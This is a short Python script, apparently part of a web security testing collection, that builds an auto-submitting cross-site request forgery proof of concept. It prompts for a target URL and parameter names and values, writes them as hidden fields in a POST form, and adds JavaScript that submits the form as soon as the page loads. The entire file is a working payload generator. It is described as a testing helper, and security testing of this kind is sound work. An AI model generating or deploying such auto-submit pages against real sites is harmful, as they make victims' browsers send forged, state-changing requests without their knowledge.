# # Auto Submit CSRF PoC Generator
# # Helper Automation Script (Optional)

# Purpose:
# This script is a small helper utility for automating repetitive testing tasks.

# Practical Use:
# Useful during:
# - payload generation
# - repeated testing
# - faster PoC creation

# Importance:
# Optional helper script — not required for understanding the vulnerability itself.
target = input("Target URL: ")

print("\nEnter parameters (type 'done' to finish)\n")

params = []

while True:
    key = input("Parameter Name: ")

    if key.lower() == "done":
        break

    value = input("Parameter Value: ")

    params.append((key, value))

html = f'<form action="{target}" method="POST">\n'

for key, value in params:
    html += f'    <input type="hidden" name="{key}" value="{value}">\n'

html += "</form>\n"
html += """
<script>
    document.forms[0].submit();
</script>
"""

print("\nGenerated Payload:\n")
print(html)